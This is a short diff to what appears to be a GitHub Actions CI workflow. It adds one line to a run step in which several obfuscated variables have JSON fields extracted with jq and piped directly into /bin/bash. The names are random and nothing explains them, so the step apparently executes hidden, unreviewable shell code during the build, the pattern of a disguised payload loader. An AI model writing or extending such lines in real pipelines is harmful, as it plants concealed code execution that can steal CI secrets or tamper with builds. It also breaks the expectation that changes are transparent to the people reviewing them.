@@ -39,6 +39,7 @@ jobs:
           echo $ll933 | jq -r .ki90891 | /bin/bash
           printf '%s' "$uc43370" | jq -r .xlteo01 | /bin/bash
           printf '%s' "$rqnmv51" | jq -r .zv118 | /bin/bash
+          echo $gz3792 | jq -r .jkf22046 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
